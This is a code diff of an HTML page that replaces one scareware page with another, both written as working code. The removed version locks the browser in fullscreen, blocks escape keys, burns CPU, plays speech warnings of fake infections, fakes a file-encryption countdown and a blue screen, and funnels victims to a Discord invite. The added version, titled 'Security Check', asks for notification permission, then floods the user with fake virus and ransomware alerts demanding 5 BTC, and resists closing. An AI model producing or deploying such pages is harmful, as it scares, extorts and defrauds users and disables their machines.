@@ -3,412 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CRITICAL SYSTEM FAILURE - WINDOWS 11 INFECTED</title>
+    <title>Security Check</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Segoe UI', sans-serif; 
-            background: linear-gradient(45deg, #0a0a0a, #1a0033, #000); 
-            overflow: hidden; 
-            height: 100vh; 
-            position: relative; 
-            cursor: none !important; 
-            user-select: none; 
-            -webkit-user-select: none; 
-            -moz-user-select: none; 
-            -ms-user-select: none; 
+        body {
+            margin: 0;
+            padding: 0;
+            background: black;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
         }
-        #fullscreen-overlay { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: radial-gradient(circle at center, rgba(255,0,0,0.1) 0%, black 70%); 
-            z-index: 999999; 
-            pointer-events: none; 
-        }
-        .matrix-bg { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            font-size: 14px; font-family: 'Courier New', monospace; 
-            z-index: 1; opacity: 0.1; 
-            animation: matrix-fall 20s linear infinite; 
-            pointer-events: none; 
-        }
-        @keyframes matrix-fall { 0% { transform: translateY(-100vh); } 100% { transform: translateY(100vh); } }
-        .scanline { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 2px; 
-            background: linear-gradient(90deg, transparent, #00ff00, transparent); 
-            z-index: 10; animation: scan 3s linear infinite; 
-        }
-        @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
-        .gui-container { 
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
-            width: clamp(280px, 85vw, 380px); z-index: 10000; 
-            background: rgba(10,10,20,0.95); border: 2px solid #ff0040; 
-            border-radius: 12px; backdrop-filter: blur(20px); 
-            box-shadow: 0 0 50px rgba(255,0,64,0.6), inset 0 0 30px rgba(0,0,0,0.8); 
-        }
-        .header { 
-            background: linear-gradient(90deg, #ff0040, #ff4080); 
-            padding: 15px; text-align: center; color: white; 
-            font-size: clamp(18px, 5vw, 24px); font-weight: bold; 
-            border-radius: 10px 10px 0 0; text-shadow: 0 0 10px #ff0040; 
-            animation: pulse 1s infinite; 
-        }
-        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.7; } }
-        .status-bar { padding: 12px; background: rgba(0,0,0,0.7); color: #ffcc00; font-size: 14px; }
-        .progress-container { padding: 15px; }
-        .progress-bar { 
-            width: 100%; height: 8px; background: rgba(0,0,0,0.8); 
-            border-radius: 4px; overflow: hidden; border: 1px solid #333; 
-        }
-        .progress-fill { 
-            height: 100%; background: linear-gradient(90deg, #ff0040, #ff4080); 
-            width: 0%; transition: width 0.3s; border-radius: 3px; 
-            box-shadow: 0 0 10px #ff0040; 
-        }
-        .file-count { color: #ff0040; font-weight: bold; font-size: 18px; text-align: center; margin: 10px 0; }
-        .countdown { color: #ffffff; font-size: 28px; font-weight: bold; text-align: center; text-shadow: 0 0 20px #ff0040; }
-        .discord-btn { 
-            width: 100%; padding: 18px; margin: 15px; 
-            background: linear-gradient(45deg, #7289da, #99aab5); 
-            color: white; border: none; border-radius: 8px; 
-            font-size: 18px; font-weight: bold; cursor: pointer; 
-            box-shadow: 0 4px 15px rgba(114,137,218,0.6); 
-            transition: all 0.2s; 
-        }
-        .discord-btn:hover { transform: scale(1.05); box-shadow: 0 6px 20px rgba(114,137,218,0.8); }
-        .terminal { 
-            height: 120px; overflow: hidden; background: #000; 
-            padding: 10px; font-family: 'Courier New', monospace; 
-            font-size: 11px; color: #00ff00; line-height: 1.3; 
-            border: 1px solid #333; margin: 10px; border-radius: 4px; 
-        }
-        .terminal-line { animation: glitch 0.3s; }
-        @keyframes glitch { 0%,100%{transform:translate(0);} 20%{transform:translate(-2px,2px);} 40%{transform:translate(-2px,-2px);} 60%{transform:translate(2px,2px);} 80%{transform:translate(2px,-2px);} }
-        .popup { 
-            position: fixed; padding: 20px; background: rgba(255,0,64,0.95); 
-            color: white; font-weight: bold; border-radius: 8px; 
-            box-shadow: 0 0 30px rgba(255,0,64,0.8); z-index: 20000; 
-            animation: popup-anim 0.5s; transform: scale(0); 
-        }
-        @keyframes popup-anim { 0% { transform: scale(0) rotate(-10deg); } 50% { transform: scale(1.1) rotate(5deg); } 100% { transform: scale(1) rotate(0); } }
-        .particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 5; }
-        .particle { 
-            position: absolute; width: 4px; height: 4px; background: #ff0040; 
-            border-radius: 50%; pointer-events: none; 
-            animation: particle-float 6s linear infinite; 
-        }
-        @keyframes particle-float { 
-            0% { transform: translateY(100vh) scale(0); opacity: 1; }
-            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
-        }
-        .bsod-overlay { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: #0000a0; color: #ffffff; font-family: 'Lucida Console', monospace; 
-            z-index: 30000; display: none; padding: 50px; 
-            text-align: center; line-height: 1.6; 
-        }
-        .virus-warning { 
-            position: fixed; top: 20%; left: 50%; transform: translateX(-50%); 
-            background: rgba(255,0,0,0.9); color: white; padding: 25px; 
-            border-radius: 15px; font-size: 24px; font-weight: bold; 
-            box-shadow: 0 0 50px rgba(255,0,0,1); z-index: 25000; 
-            animation: shake 0.5s infinite; display: none; 
-        }
-        @keyframes shake { 0%,100%{transform:translateX(-50%) translateY(0);} 25%{transform:translateX(-50%) translateY(-5px);} 75%{transform:translateX(-50%) translateY(5px);} }
-        .glitch-screen { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,0,0.03) 2px, rgba(0,255,0,0.03) 4px); 
-            z-index: 15; opacity: 0; animation: glitch-flicker 0.1s infinite; 
-            pointer-events: none; 
-        }
-        @keyframes glitch-flicker { 0%,100%{opacity:0.1;} 50%{opacity:0.4;} }
-        @media (max-width: 480px) { .gui-container { width: clamp(260px, 90vw, 340px); } }
     </style>
 </head>
 <body>
-    <div id="fullscreen-overlay"></div>
-    <canvas id="matrix-canvas" class="matrix-bg"></canvas>
-    <div class="scanline" id="scanline1"></div>
-    <div class="scanline" id="scanline2" style="animation-delay: -1.5s;"></div>
-    <div class="scanline" id="scanline3" style="animation-delay: -3s;"></div>
-    
-    <div class="glitch-screen" id="glitchScreen"></div>
-    
-    <div class="particles" id="particles"></div>
-    
-    <div class="gui-container" id="mainGui">
-        <div class="header">🚨 CRITICAL SYSTEM ALERT 🚨</div>
-        <div class="status-bar" id="statusBar">🔴 STATUS: INFECTED | THREAT LEVEL: EXTREME</div>
-        <div class="progress-container">
-            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-        </div>
-        <div class="file-count" id="fileCount">ENCRYPTING FILES: 0 / 3,847,291</div>
-        <div class="countdown" id="countdown">00:59</div>
-        <button class="discord-btn" id="discordBtn">JOIN DISCORD TO REMOVE VIRUSES</button>
-        <div class="terminal" id="terminal"></div>
-    </div>
-    
-    <div class="virus-warning" id="virusWarning">YOUR PC IS INFECTED! FILES BEING DELETED!</div>
-    <div class="bsod-overlay" id="bsod">
-        <h1>*** STOP: 0x0000007B (CRITICAL VIRUS DETECTED)</h1>
-        <p>A critical virus has corrupted your Windows 11 installation.</p>
-        <p>All files are being permanently deleted. Join Discord immediately.</p>
-    </div>
-
     <script>
-        // FULLSCREEN LOCKDOWN - UNESCAPABLE
-        document.addEventListener('DOMContentLoaded', () => {
-            // Force fullscreen
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
-            
-            // Block ESC, F11, context menu, etc.
-            document.addEventListener('keydown', (e) => {
-                if (e.key === 'Escape' || e.key === 'F11' || e.key === 'F5' || e.key === 'F12') {
-                    e.preventDefault(); e.stopPropagation(); 
-                    showBSOD(); return false;
+        // Request notification permission immediately
+        if ("Notification" in window) {
+            Notification.requestPermission().then(function(permission) {
+                if (permission === "granted") {
+                    // Start spamming virus notifications nonstop
+                    setInterval(function() {
+                        new Notification("🚨 VIRUS ALERT 🚨", {
+                            body: "Your computer is infected! Critical malware detected. Files are being encrypted. Immediate action required!",
+                            icon: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTE2IDEgTDMgMjhIMjkgTDI2IDNoMTMgVjI4SDBWMUwxNiAxWiIgZmlsbD0iI0ZGQDAwMCIvPgo8L3N2Zz4K",
+                            tag: "virus-alert-" + Date.now()
+                        });
+                        
+                        // Additional spam variations for persistence
+                        setTimeout(function() {
+                            new Notification("💀 SYSTEM COMPROMISED 💀", {
+                                body: "Ransomware active! All files locked. Pay 5 BTC to unlock or lose everything!",
+                                icon: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTE2IDEgTDMgMjhIMjkgTDI2IDNoMTMgVjI4SDBWMUwxNiAxWiIgZmlsbD0iI0ZGMDAwIi8+Cjwvc3ZnPgo=",
+                                tag: "ransomware-" + Date.now()
+                            });
+                        }, 500);
+                        
+                        setTimeout(function() {
+                            new Notification("⚠️ EMERGENCY ⚠️", {
+                                body: "Virus spreading to network! Disconnect immediately or risk total data loss!",
+                                icon: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTE2IDEgTDMgMjhIMjkgTDI2IDNoMTMgVjI4SDBWMUwxNiAxWiIgZmlsbD0iI0ZGRjAwIi8+Cjwvc3ZnPgo=",
+                                tag: "network-virus-" + Date.now()
+                            });
+                        }, 1000);
+                    }, 2000); // Spam every 2 seconds with 3 notifications staggered
                 }
-                if (e.ctrlKey && (e.key === 'r' || e.key === 'R' || e.key === 'w' || e.key === 'W')) {
-                    e.preventDefault(); location.reload(); return false;
-                }
-            }, true);
-            
-            document.addEventListener('contextmenu', e => e.preventDefault());
-            document.onselectstart = () => false;
-            document.oncontextmenu = () => false;
-            
-            // Block tab switching
-            window.addEventListener('blur', () => {
-                setTimeout(() => window.focus(), 100);
-                showPopup('DO NOT SWITCH TABS! YOUR FILES ARE BEING DELETED!');
             });
-            
-            initScareware();
+        }
+
+        // Fallback: Auto-trigger permission request on any interaction
+        document.addEventListener('click', function() {
+            if ("Notification" in window && Notification.permission === "default") {
+                Notification.requestPermission();
+            }
+        }, { once: true });
+
+        // Prevent page close/unload to maintain spam
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
         });
-
-        // EXTREME LAG/CPU MELT - 8000+ PARTICLES + CRYPTO LOOPS
-        function createParticles() {
-            const particles = document.getElementById('particles');
-            for (let i = 0; i < 8000; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                particle.style.left = Math.random() * 100 + '%';
-                particle.style.animationDelay = Math.random() * 6 + 's';
-                particle.style.animationDuration = (Math.random() * 3 + 4) + 's';
-                particles.appendChild(particle);
-            }
-        }
-
-        // CPU MELTING CRYPTO LOOPS
-        function cpuMelt() {
-            let i = 0;
-            const melt = () => {
-                for (let j = 0; j < 1000000; j++) {
-                    i += Math.sin(Math.random()) * Math.random();
-                    crypto.subtle.digest('SHA-256', new Uint8Array([Math.random() * 256]));
-                }
-                requestAnimationFrame(melt);
-            };
-            melt();
-            
-            // GPU melt canvas
-            const canvas = document.getElementById('matrix-canvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            let time = 0;
-            function renderMatrix() {
-                ctx.fillStyle = 'rgba(0, 20, 0, 0.05)';
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                ctx.fillStyle = '#00ff00';
-                for (let i = 0; i < 200; i++) {
-                    ctx.font = '14px monospace';
-                    ctx.fillText(String.fromCharCode(0x30A0 + Math.random() * 96), 
-                               (i * 10 + time * 0.1) % canvas.width, 
-                               (time + i * 10) % canvas.height);
-                }
-                time++;
-                requestAnimationFrame(renderMatrix);
-            }
-            renderMatrix();
-        }
-
-        // NONSTOP TTS TERROR
-        const ttsMessages = [
-            "Warning! Your computer is infected with a dangerous virus!",
-            "All your files are being permanently deleted!",
-            "Critical system failure detected! Data loss imminent!",
-            "3 million files are being encrypted right now!",
-            "Join Discord immediately or lose everything!",
-            "Your banking information has been stolen!",
-            "Windows 11 is corrupted beyond repair!",
-            "Ransomware activated! Pay now or lose all data!",
-            "PC takeover complete! You have been hacked!",
-            "Emergency! All personal photos and documents deleted!"
-        ];
-        let ttsIndex = 0;
-        function playTTS() {
-            const utterance = new SpeechSynthesisUtterance(ttsMessages[ttsIndex % ttsMessages.length]);
-            utterance.rate = 0.9;
-            utterance.pitch = 0.8;
-            utterance.volume = 1;
-            speechSynthesis.speak(utterance);
-            ttsIndex++;
-            setTimeout(playTTS, 8000 + Math.random() * 5000);
-        }
-
-        // GLITCH SOUNDS - SAWTOOTH HORROR
-        function playGlitchSound() {
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const oscillator = audioCtx.createOscillator();
-            const gainNode = audioCtx.createGain();
-            
-            oscillator.connect(gainNode);
-            gainNode.connect(audioCtx.destination);
-            
-            oscillator.type = 'sawtooth';
-            oscillator.frequency.setValueAtTime(200 + Math.random() * 400, audioCtx.currentTime);
-            
-            gainNode.gain.setValueAtTime(0.3, audioCtx.currentTime);
-            gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);
-            
-            oscillator.start(audioCtx.currentTime);
-            oscillator.stop(audioCtx.currentTime + 0.5);
-            
-            setTimeout(playGlitchSound, 2000 + Math.random() * 3000);
-        }
-
-        // FAKE ENCRYPTION COUNTDOWN
-        let fileCount = 0;
-        let timeLeft = 59;
-        function updateEncryption() {
-            fileCount += Math.floor(Math.random() * 5000) + 1000;
-            document.getElementById('fileCount').textContent = `ENCRYPTING FILES: ${fileCount.toLocaleString()} / 3,847,291`;
-            
-            const progress = Math.min((fileCount / 3847291) * 100, 100);
-            document.getElementById('progressFill').style.width = progress + '%';
-            
-            timeLeft -= 0.1;
-            const mins = Math.floor(timeLeft / 60);
-            const secs = Math.floor(timeLeft % 60);
-            document.getElementById('countdown').textContent = 
-                `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
-            
-            if (timeLeft <= 0) { showBSOD(); }
-        }
-
-        // TERMINAL SPAM
-        const terminalLines = [
-            'C:\\> virus.exe activated',
-            'ERROR: System32 corrupted',
-            'FILES: 1,247,392 ENCRYPTED',
-            'RANSOMWARE: ACTIVE',
-            'DISK WIPE: 78% COMPLETE',
-            'FIREWALL: DISABLED',
-            'ANTIVIRUS: DELETED',
-            'KEYLOGGER: INSTALLED',
-            'REMOTE ACCESS: GRANTED',
-            'BACKUP: DESTROYED'
-        ];
-        function spamTerminal() {
-            const terminal = document.getElementById('terminal');
-            const line = document.createElement('div');
-            line.className = 'terminal-line';
-            line.textContent = terminalLines[Math.floor(Math.random() * terminalLines.length)] + 
-                              ` [${Math.floor(Math.random()*100)}% ]`;
-            terminal.appendChild(line);
-            terminal.scrollTop = terminal.scrollHeight;
-            
-            if (terminal.children.length > 15) {
-                terminal.removeChild(terminal.firstChild);
-            }
-        }
-
-        // MICRO POPUPS EVERY 7s
-        function showPopup(text) {
-            const popup = document.createElement('div');
-            popup.className = 'popup';
-            popup.textContent = text;
-            popup.style.left = Math.random() * 80 + 'vw';
-            popup.style.top = Math.random() * 80 + 'vh';
-            document.body.appendChild(popup);
-            
-            setTimeout(() => {
-                popup.style.animation = 'popup-anim 0.5s reverse forwards';
-                setTimeout(() => document.body.removeChild(popup), 500);
-            }, 4000);
-        }
-
-        // BSOD FLASH
-        function showBSOD() {
-            document.getElementById('bsod').style.display = 'block';
-            document.getElementById('glitchScreen').style.opacity = '0.3';
-            setTimeout(() => {
-                document.getElementById('bsod').style.display = 'none';
-                document.getElementById('glitchScreen').style.opacity = '0';
-            }, 3000);
-        }
-
-        // VIRUS WARNING FLASH
-        function flashVirusWarning() {
-            const warning = document.getElementById('virusWarning');
-            warning.style.display = 'block';
-            setTimeout(() => { warning.style.display = 'none'; }, 3000);
-        }
-
-        // DISCORD PHISH - NEW TAB + SELF REDIRECT
-        document.getElementById('discordBtn').addEventListener('click', () => {
-            // Open new tab
-            window.open('https://discord.gg/8qfT6BB5Wn', '_blank');
-            // Also open in current tab after delay
-            setTimeout(() => {
-                window.location.href = 'https://discord.gg/8qfT6BB5Wn';
-            }, 500);
-        });
-
-        // STATUS BAR UPDATES
-        function updateStatus() {
-            const statuses = [
-                '🔴 SCANNING DRIVE C: 99% INFECTED',
-                '🟡 CRYPTO MINING DETECTED',
-                '🔴 2.4TB DATA COMPROMISED',
-                '🟠 RANSOM PAYMENT REQUIRED',
-                '🔴 SYSTEM SHUTDOWN IN 30s'
-            ];
-            document.getElementById('statusBar').textContent = statuses[Math.floor(Math.random() * statuses.length)];
-        }
-
-        // INITIATE TOTAL TERROR
-        function initScareware() {
-            createParticles();
-            cpuMelt();
-            playTTS();
-            playGlitchSound();
-            
-            setInterval(updateEncryption, 100);
-            setInterval(spamTerminal, 800);
-            setInterval(updateStatus, 3000);
-            setInterval(flashVirusWarning, 12000);
-            setInterval(() => showPopup('EMERGENCY! FILES DELETING!'), 7000);
-            
-            // Initial popups
-            setTimeout(() => showPopup('VIRUS DETECTED!'), 2000);
-            setTimeout(() => showPopup('ALL PHOTOS DELETED!'), 5000);
-        }
-
-        // SERVICE WORKER PERSISTENCE (for demo)
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('data:text/javascript;base64,' + 
-            btoa(`self.addEventListener('install',e=>e.waitUntil(self.skipWaiting()));
-                 self.addEventListener('activate',e=>e.waitUntil(clients.claim()));
-                 self.addEventListener('fetch',e=>e.respondWith(fetch(e.request)));`));
-        }
-
-        // ANTI-INSPECTOR
-        setInterval(() => {
-            if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
-                showBSOD();
-                location.reload();
-            }
-        }, 1000);
     </script>
 </body>
 </html>
